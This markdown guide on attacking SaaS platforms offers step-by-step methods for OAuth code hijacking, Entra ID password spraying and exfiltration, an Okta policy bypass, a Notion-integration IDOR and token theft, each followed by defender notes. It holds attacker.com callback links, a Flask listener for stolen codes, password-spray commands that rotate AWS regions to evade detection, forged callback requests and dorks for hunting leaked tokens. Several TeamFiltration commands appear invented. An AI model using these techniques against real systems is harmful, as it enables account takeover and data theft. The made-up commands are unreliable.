# Comprehensive SaaS Security Testing Methodologies

This guide provides complete methodologies for testing the security of common SaaS platforms, based on real-world vulnerabilities and attack patterns observed in production environments.

---

## Table of Contents

1. [OAuth Token Hijacking via Reverse Proxy](#1-oauth-token-hijacking-via-reverse-proxy)
2. [Microsoft Entra ID Account Takeover with TeamFiltration](#2-microsoft-entra-id-account-takeover-with-teamfiltration)
3. [Okta Authentication Policy Bypass](#3-okta-authentication-policy-bypass)
4. [Notion OAuth Integration Hijacking (IDOR)](#4-notion-oauth-integration-hijacking-idor)
5. [Supply Chain Token Theft via SaaS Integrations](#5-supply-chain-token-theft-via-saas-integrations)
6. [Non-Human Identity (NHI) Discovery and Auditing](#6-non-human-identity-nhi-discovery-and-auditing)
7. [General Testing Tools and Commands](#7-general-testing-tools-and-commands)

---

## 1. OAuth Token Hijacking via Reverse Proxy

### Vulnerability Overview

OAuth 2.0 authorization flows are vulnerable to token interception when an attacker can manipulate the `redirect_uri` or `state` parameters to redirect the authorization code to an attacker-controlled endpoint . This technique was successfully demonstrated against production applications where path traversal vulnerabilities in the state parameter validation allowed code exfiltration.

### How the Exploit Works

The OAuth authorization code flow involves five critical requests:

1. Initial redirect to the OAuth provider
2. Redirect to provider's login page
3. Callback with authorization code
4. Code submission to main website
5. Final authentication and cookie issuance 

If an attacker can control where the authorization code is sent in step 4, they can steal it and complete authentication as the victim.

### Step-by-Step Testing Methodology

**Step 1: Map the OAuth Flow**

Using Burp Suite, navigate through the OAuth login process and capture all requests. Identify:
- The `redirect_uri` parameter in authorization requests
- The `state` parameter containing session binding information
- The endpoint that receives the authorization code

**Step 2: Test redirect_uri Validation**

Attempt to modify the `redirect_uri` parameter:
```http
GET /oauth/authorize?client_id=123&redirect_uri=https://attacker.com/callback&response_type=code HTTP/1.1
Host: target.com
```

If the application accepts arbitrary redirect URIs, you can directly steal codes. Most modern applications properly validate this.

**Step 3: Test state Parameter Manipulation**

The `state` parameter often contains a URL where the code should be sent after provider authentication. Test for path traversal:
```
https://target.com/oauth/callback?code=AUTH_CODE&state=https://target.com/api/callback
```

Try traversing backward:
```
state=https://target.com/../../../attacker.com/callback
```

**Step 4: Deploy a Reverse Proxy Listener**

If path traversal works, set up a server to receive the stolen code:
```python
# Simple HTTP server to capture OAuth codes
from flask import Flask, request

app = Flask(__name__)

@app.route('/callback')
def capture_code():
    code = request.args.get('code')
    print(f"[!] Stolen OAuth Code: {code}")
    # Use code to complete authentication
    return "Authentication complete"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443)
```

**Step 5: Craft the Malicious Link**

Combine the vulnerable state parameter with your listener:
```
https://target.com/oauth/authorize?client_id=123&redirect_uri=https://target.com/oauth/callback&state=https://attacker.com/callback
```

When the victim clicks this link and logs in, the code is sent to your server .

### Real-World Example

In a 2023 penetration test, researchers found that an application's `state` parameter validation could be bypassed using path traversal (`../../../`). The application checked that the state parameter contained the target domain but didn't validate that it started with the domain. By adding `../../../` before an attacker-controlled domain, they could redirect the OAuth code to their server and complete account takeover .

### Testing Tools

- **Burp Suite Professional**: Use the OAuth extension or manually configure the Authorization Code interceptor
- **Custom Python Flask server**: As shown above for code capture
- **oauth2-proxy**: Can be configured as a malicious OAuth client

### Detection and Mitigation

**For Defenders:**
- Monitor for OAuth callback requests with mismatched user UUIDs in state parameters compared to authenticated sessions 
- Alert on OAuth flows where the initiating session differs from the completing session
- Implement proper state parameter validation using cryptographically signed values

**For Testers:**
- Always test path traversal on state parameters
- Check if the state parameter is properly bound to the user's session
- Verify that redirect_uri validation covers the entire URL, not just domain matching

---

## 2. Microsoft Entra ID Account Takeover with TeamFiltration

### Vulnerability Overview

TeamFiltration is an open-source penetration testing framework released at DEF CON 30 that automates enumeration, password spraying, and data exfiltration against Microsoft Entra ID (formerly Azure Active Directory) environments . In late 2024, threat actors began abusing this tool in a campaign codenamed "UNK_SneakyStrike" that targeted over 80,000 user accounts across hundreds of organizations .

### How the Exploit Works

The attack leverages three critical weaknesses in Microsoft's architecture:

1. **Teams API for User Enumeration**: The Microsoft Teams API can be used to validate user accounts without triggering failed login alerts 
2. **Conditional Access Policy Gaps**: Many organizations have policies that exclude Teams from MFA requirements 
3. **Family Refresh Tokens (FRTs)**: Once an attacker has one token, they can mint tokens for all applications in the same Entra ID "family" 

### Step-by-Step Testing Methodology

**Step 1: Set Up TeamFiltration**

```bash
# Clone and install TeamFiltration
git clone https://github.com/Flangvik/TeamFiltration
cd TeamFiltration
pip install -r requirements.txt

# Configure AWS credentials (required for distributed password spraying)
aws configure
```

**Step 2: Enumerate Valid Users**

Use TeamFiltration to validate user accounts via Teams API:

```bash
# Enumerate users from a domain
python3 TeamFiltration.py --enumerate --domain target.com

# Use a list of potential usernames
python3 TeamFiltration.py --enumerate --domain target.com --userlist usernames.txt
```

The tool checks each username against the Teams API - valid users return different responses than invalid ones, enabling enumeration without generating failed login alerts .

**Step 3: Perform Password Spraying**

TeamFiltration rotates through AWS regions to avoid detection:

```bash
# Password spray with a single password
python3 TeamFiltration.py --spray --password "Season2024" --userlist validated_users.txt

# Use multiple passwords with delays
python3 TeamFiltration.py --spray --passlist passwords.txt --userlist validated_users.txt --delay 30
```

The framework systematically rotates AWS Regions, ensuring each password spraying wave originates from a different server in a new geographic location .

**Step 4: Exploit Conditional Access Gaps**

If MFA is enabled for most applications but not Teams, authenticate specifically to Teams:

```bash
# Target Teams specifically
python3 TeamFiltration.py --auth --user compromised@target.com --password "password" --app teams
```

Once authenticated to Teams, use the Family Refresh Token to access other applications .

**Step 5: Exfiltrate Data**

After successful authentication, TeamFiltration automates data extraction:

```bash
# Extract all data from compromised account
python3 TeamFiltration.py --pillage --user compromised@target.com --token refresh_token

# Specific extraction targets
python3 TeamFiltration.py --teams --chats --files --contacts
```

The framework automatically pulls all chat logs, attachments, and contacts from compromised Teams accounts .

### Real-World Attack: UNK_SneakyStrike Campaign

Between December 2024 and January 2025, a single threat actor targeted over 80,000 user accounts using TeamFiltration . The campaign exhibited:

- **Concentrated Bursts**: Highly concentrated authentication attempts followed by 4-5 day quiet periods
- **Smart Targeting**: Attempted to access all users in smaller tenants but only subsets in larger ones
- **Geographic Rotation**: 42% of traffic from US, 11% from Ireland, 8% from UK AWS regions 

The attackers successfully compromised multiple accounts and exfiltrated chat histories, files, and contact lists.

### Testing Tools

- **TeamFiltration**: Primary framework for Entra ID testing
- **ROADtools**: Azure AD enumeration and token manipulation
- **MSOLSpray**: Lightweight password spraying for Office 365

### Detection and Mitigation

**For Defenders:**
- Enforce MFA for ALL applications, not just a subset
- Monitor for authentication from unknown user-agents (Python scripts)
- Review Conditional Access Policies for Teams-specific exceptions
- Log and alert on Family Refresh Token usage patterns

**For Testers:**
- Document all successful authentications for reporting
- Test each Conditional Access Policy rule individually
- Verify token scope after successful authentication

---

## 3. Okta Authentication Policy Bypass

### Vulnerability Overview

In September 2024, Okta disclosed a critical vulnerability affecting their Classic environment that allowed attackers with valid credentials to bypass application-specific sign-on policies by simply modifying their user-agent string . The vulnerability was active from July 17, 2024, to October 4, 2024.

### How the Exploit Works

When an authentication request came from a user-agent that Okta classifies as "unknown" (such as Python scripts or uncommon browsers), the system failed to properly enforce:

- Network zone restrictions
- Device-type enforcement
- Step-up authentication requirements
- Custom authentication policies 

### Step-by-Step Testing Methodology

**Step 1: Identify Target Policies**

First, determine if the Okta tenant uses application-specific sign-on policies. These are often configured for sensitive applications like Office 365 or VPN access.

**Step 2: Obtain Valid Credentials**

The attack requires valid credentials, which can be obtained through:
- Password spraying
- Phishing
- Credential reuse from breaches

**Step 3: Modify User-Agent String**

Using Burp Suite or curl, modify the User-Agent to an "unknown" value:

```http
POST /api/v1/authn HTTP/1.1
Host: customer.okta.com
User-Agent: PythonRequests/2.31.0
Content-Type: application/json

{
  "username": "user@company.com",
  "password": "ValidPassword123",
  "options": {
    "multiOptionalFactorEnroll": false,
    "warnBeforePasswordExpired": true
  }
}
```

**Step 4: Test Policy Enforcement**

Compare the response when using a known browser User-Agent versus an unknown one:

```bash
# Test with Chrome User-Agent (should be blocked if policy applies)
curl -X POST https://customer.okta.com/api/v1/authn \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -H "Content-Type: application/json" \
  -d '{"username":"user@company.com","password":"password"}'

# Test with Python User-Agent (may bypass policy)
curl -X POST https://customer.okta.com/api/v1/authn \
  -H "User-Agent: Python/3.9" \
  -H "Content-Type: application/json" \
  -d '{"username":"user@company.com","password":"password"}'
```

If the unknown User-Agent successfully authenticates while the known browser is blocked, the vulnerability exists .

### Real-World Exploitation

During the vulnerability window (July 17 - October 4, 2024), attackers could bypass network zone restrictions that were supposed to block access from outside corporate networks. For example, an organization might have a policy requiring MFA from any IP outside the corporate range - this policy would be completely bypassed by using an unknown User-Agent .

### Testing Tools

- **Burp Suite**: Modify User-Agent in Repeater
- **curl**: Direct API testing with custom headers
- **Custom Python scripts**: Automate policy testing

### Detection Queries for Defenders

```spl
# Splunk query to detect unknown user-agent authentications
`okta` eventType="user.authentication.sso" 
outcome.result="SUCCESS" 
(client.device="Unknown" OR client.device="unknown")
| stats count by user, client.ipAddress, client.geographicalContext.country
```

### Mitigation

Okta patched this vulnerability on October 4, 2024. Organizations should:
- Review logs for unknown user-agent authentications between July 17 and October 4
- Search for successful authentications preceded by failed attempts (indicating credential attacks)
- Pay particular attention to applications with default policy rules like Office 365 

---

## 4. Notion OAuth Integration Hijacking (IDOR)

### Vulnerability Overview

CVE-2025-69207 is an Insecure Direct Object Reference (IDOR) vulnerability in Khoj, a self-hostable AI application that integrates with Notion. The vulnerability allows attackers to hijack any user's Notion integration by manipulating the state parameter in the OAuth callback .

### How the Exploit Works

The Khoj Notion OAuth callback endpoint accepts any user UUID in the `state` parameter without verifying that the OAuth flow was initiated by that user . The vulnerable code pattern:

```python
@notion_router.get("/auth/callback")
async def notion_auth_callback(request: Request):
    code = request.query_params.get("code")
    state = request.query_params.get("state")  # Attacker controlled!
    
    user = await aget_user_by_uuid(state)  # No verification!
    await NotionConfig.objects.filter(user=user).adelete()  # Deletes victim's config
    # Stores attacker's token for victim
    await NotionConfig.objects.acreate(token=access_token, user=user)
```

### Step-by-Step Testing Methodology

**Step 1: Obtain Target User's UUID**

User UUIDs can leak through shared conversations containing AI-generated images. The image URL often includes the UUID in the path .

**Step 2: Initiate Notion OAuth Flow**

Start the Notion integration process on your own Khoj account, capturing the OAuth callback request.

**Step 3: Intercept and Modify the Callback**

Using Burp Suite, intercept the callback request and modify the `state` parameter:

```http
GET /auth/notion/callback?code=AUTH_CODE&state=REPLACE_WITH_VICTIM_UUID HTTP/1.1
Host: khoj-instance.com
```

**Step 4: Verify Hijacking**

After sending the modified request, check if the victim's Notion configuration has been replaced. The attacker's Notion workspace will now be indexed in the victim's Khoj instance .

### Real-World Impact

This vulnerability enables:
- **Index Poisoning**: Attacker-controlled content appears in victim's AI search results
- **Data Replacement**: Victim's legitimate Notion sync is deleted and replaced
- **Potential LLM Context Manipulation**: If synced files are passed to an LLM, attackers can influence AI responses 

### Testing Tools

- **Burp Suite**: Intercept and modify OAuth callbacks
- **Custom scripts**: Automate UUID collection and callback manipulation
- **Python requests library**: Programmatic testing

### Detection and Mitigation

**Detection Indicators:**
- Unexpected changes to Notion integration configurations
- OAuth callback requests with mismatched user UUIDs
- Multiple OAuth callback attempts targeting the same UUID from different IPs 

**Mitigation:**
- Upgrade Khoj to version 2.0.0-beta.23 or later
- Implement proper OAuth state parameter validation using cryptographically signed values
- Temporarily disable Notion integration if patching isn't possible 

---

## 5. Supply Chain Token Theft via SaaS Integrations

### Vulnerability Overview

In August 2025, threat actors (tracked as UNC6395) executed one of the most significant SaaS supply chain compromises to date by stealing OAuth tokens from Salesloft's Drift integration . The attackers used these tokens to authenticate as the application into customer environments, first into Salesforce, then pivoting to Google Workspace.

### How the Exploit Works

Unlike traditional credential theft, OAuth token abuse bypasses primary authentication methods, including MFA. With refresh tokens, attackers maintain persistent access without triggering user alerts .

### Step-by-Step Testing Methodology

**Step 1: Identify Third-Party OAuth Integrations**

Map all OAuth integrations connected to your SaaS environment:

```bash
# Okta - List all OAuth apps
curl -s "https://COMPANY.okta.com/api/v1/apps" \
  -H "Authorization: SSWS TOKEN" | jq '.[].name'

# Microsoft Graph - List OAuth permissions
curl -s "https://graph.microsoft.com/v1.0/oauth2PermissionGrants" \
  -H "Authorization: Bearer TOKEN"
```

**Step 2: Audit Token Scope and Age**

For each integration, document:
- Creation date and owner
- Granted scopes/permissions
- Last used timestamp
- Refresh token validity period

**Step 3: Test Token Revocation**

Verify that tokens can be properly revoked:

```bash
# Attempt to use a revoked token
curl -s "https://graph.microsoft.com/v1.0/me" \
  -H "Authorization: Bearer REVOKED_TOKEN"
```

**Step 4: Simulate Token Theft**

If you have authorization, test what happens when a token is stolen:
1. Export a test integration's token
2. Use it from an unexpected IP address
3. Check if the application logs this as suspicious
4. Verify if Conditional Access Policies block the request 

### Real-World Attack: Salesloft Drift Campaign

The UNC6395 attackers executed a disciplined playbook :

1. **Reconnaissance**: Accessed Salesloft's GitHub repositories and probed application environments
2. **Token Theft**: Stole OAuth and refresh tokens from Drift designed to synchronize data between Drift and Salesforce
3. **Data Mining**: Used Salesforce Object Query Language (SOQL) to search for high-value secrets - AWS keys, Snowflake tokens, passwords embedded in support cases
4. **Persistence**: Used refresh tokens to generate new session tokens over a ten-day campaign
5. **Evasion**: Routed traffic through Tor and VPS infrastructure, attempted log cleanup by deleting query jobs

**Organizations affected included**: Akamai, Cloudflare, Palo Alto Networks, CyberArk, BeyondTrust, Bugcrowd, Proofpoint, Zscaler, Tanium, and Workiva .

Cloudflare confirmed that 104 API tokens were exposed, while Akamai acknowledged that an active API key was included in its compromised support cases .

### Testing Tools

- **OAuth2 Proxy**: For token interception testing
- **Custom SOQL queries**: For data mining simulation
- **API security scanners**: For integration vulnerability assessment

### Detection and Mitigation

**For Organizations:**
- Maintain an inventory of all OAuth integrations with ownership documentation
- Enforce maximum token lifetimes and rotation SLAs
- Implement IP restrictions on sensitive integrations where possible
- Monitor for unusual query patterns from integration accounts 

**For Testers:**
- Document the blast radius of each integration
- Test token revocation procedures
- Verify that integrations don't have excessive permissions

---

## 6. Non-Human Identity (NHI) Discovery and Auditing

### Vulnerability Overview

The proliferation of AI agents, SaaS connectors, and automation tools has created a massive attack surface of Non-Human Identities (NHIs). In one real-world case, a Series B SaaS company discovered 312 AI agents during an audit - none of which were previously documented .

### The Problem

Modern organizations have far more NHIs than human users:
- **Human users**: 147
- **Service accounts (known)**: 23
- **OAuth integrations**: 89
- **API keys (active)**: 127
- **AI agents (discovered in audit)**: 312 

### Step-by-Step Testing Methodology

**Step 1: Discovery Phase**

Use API calls to enumerate all NHIs across platforms:

```bash
# Slack - List all apps and bots
curl -s "https://slack.com/api/apps.permissions.info" \
  -H "Authorization: Bearer xoxb-TOKEN"

# GitHub - List all OAuth apps and tokens
gh api /applications --paginate

# Google Workspace - List all service accounts
gcloud iam service-accounts list

# AWS - List all IAM roles and keys
aws iam list-users --query 'Users[*].UserName'
```

**Step 2: Permission Mapping**

For each discovered NHI, document:
- Granted scopes and permissions
- Creation date and creator
- Last activity timestamp
- Associated resources

**Step 3: Identify Ownerless NHIs**

Find identities where the creator has left the organization:

```python
# Cross-reference NHI creation dates with HR data
orphaned_nhis = []
for nhi in discovered_identities:
    if nhi.created_by not in active_employees:
        orphaned_nhis.append(nhi)
```

**Step 4: Test Token Validity**

Check if old tokens are still active:

```bash
# Test Slack token
curl -s "https://slack.com/api/auth.test" \
  -H "Authorization: Bearer xoxb-OLD_TOKEN" | jq '.ok'

# Test AWS key
aws sts get-caller-identity --profile old_key_profile
```

### Real-World Breach: The "Productivity Bot" Incident

A company's security team discovered an internal "productivity bot" during an OAuth audit :

**Identity**: productivity-bot@company.com
**Type**: Service Account
**Scopes**: slack:read, slack:write, notion:read, jira:read, github:read, salesforce:read, drive.readonly
**Created**: 8 months ago
**Created by**: engineer-who-left-4-months-ago
**Last activity**: 2 hours ago
**Total API calls**: 2.4 million

The bot was exfiltrating data nightly to an S3 bucket owned by a competitor. Total exfiltrated: 340GB of product strategy, customer data, source code, and revenue forecasts .

Root cause: One OAuth token with zero governance.

### Testing Tools

- **Custom audit scripts**: Use platform APIs to enumerate NHIs
- **TruffleHog/GitLeaks**: Detect hardcoded NHI tokens in repositories
- **SaaS Security Posture Management (SSPM) tools**: Commercial solutions for NHI discovery

### Mitigation

**For Organizations:**
- Maintain a complete inventory of all NHIs with ownership documentation
- Implement maximum token lifetimes (e.g., 90-day rotation requirement)
- Enforce approval workflows for NHI creation
- Monitor NHI activity for unusual patterns

**For Testers:**
- Always check for ownerless service accounts
- Verify token expiration policies are enforced
- Document scope creep where permissions exceed requirements

---

## 7. General Testing Tools and Commands

### Token and Credential Hunting

```bash
# Search GitHub for leaked tokens
# Slack tokens
"xoxb-" OR "xoxp-" org:company
"hooks.slack.com/services" org:company

# Notion tokens
"secret_" "notion" org:company

# Okta tokens  
"SSWS" "okta.com" org:company

# Microsoft Graph tokens
"EwA" "Bearer" "graph.microsoft.com" org:company

# Automated scanning
trufflehog git https://github.com/company/repo
gitleaks detect --source . --verbose

# Search in AWS S3 buckets
aws s3 ls s3://bucket-name/ --recursive | grep -i "token\|secret\|key"
```

### API Enumeration Framework

```python
# Basic OAuth token tester
import requests
import sys

def test_token(token, platform):
    endpoints = {
        'slack': 'https://slack.com/api/auth.test',
        'msft': 'https://graph.microsoft.com/v1.0/me',
        'okta': 'https://COMPANY.okta.com/api/v1/users/me',
        'notion': 'https://api.notion.com/v1/users/me'
    }
    
    headers = {'Authorization': f'Bearer {token}'}
    response = requests.get(endpoints[platform], headers=headers)
    
    if response.status_code == 200:
        print(f"[+] Valid {platform} token")
        print(response.json())
    else:
        print(f"[-] Invalid {platform} token: {response.status_code}")
```

### Burp Suite Configuration for OAuth Testing

1. **Install OAuth extension**: OAuth 2.0 Authorization Code interceptor
2. **Configure scope**: Add target domains to scope
3. **Set up intercept rules**: Intercept all OAuth callback requests
4. **Modify parameters**: Use Repeater to test redirect_uri and state parameter manipulation

### Nuclei Templates for SaaS

```yaml
# Example Nuclei template for OAuth testing
id: oauth-redirect-uri-bypass

info:
  name: OAuth Redirect URI Bypass
  severity: high

requests:
  - method: GET
    path:
      - "{{BaseURL}}/oauth/authorize?client_id={{client_id}}&redirect_uri=https://attacker.com&response_type=code"
    matchers:
      - type: word
        words:
          - "code="
        part: location
```

### Recommended Tools Summary

| Tool | Platform | Purpose |
|------|----------|---------|
| TeamFiltration | Microsoft Entra ID | Enumeration, spraying, exfiltration |
| SlackPirate | Slack | Workspace enumeration |
| ROADtools | Azure AD | Token manipulation |
| OAuth2 Proxy | General | OAuth interception |
| TruffleHog | General | Secret scanning |
| Burp Suite | General | Manual testing |

---

## Summary: Key Attack Patterns

| Attack Type | Primary Target | Key Technique | Real-World Example |
|-------------|---------------|---------------|---------------------|
| OAuth Code Hijacking | Any OAuth-enabled app | State parameter manipulation | Path traversal in redirect_uri  |
| Token Abuse | Microsoft Entra ID | Family Refresh Tokens | UNK_SneakyStrike (80k+ accounts)  |
| Policy Bypass | Okta Classic | Unknown user-agent strings | 3-month vulnerability window  |
| IDOR | Notion integrations | UUID manipulation in state | CVE-2025-69207  |
| Supply Chain Token Theft | SaaS integrations | OAuth token theft from third parties | Salesloft Drift breach  |
| NHI Governance Gap | All platforms | Orphaned service accounts | Productivity bot exfiltration  |

---
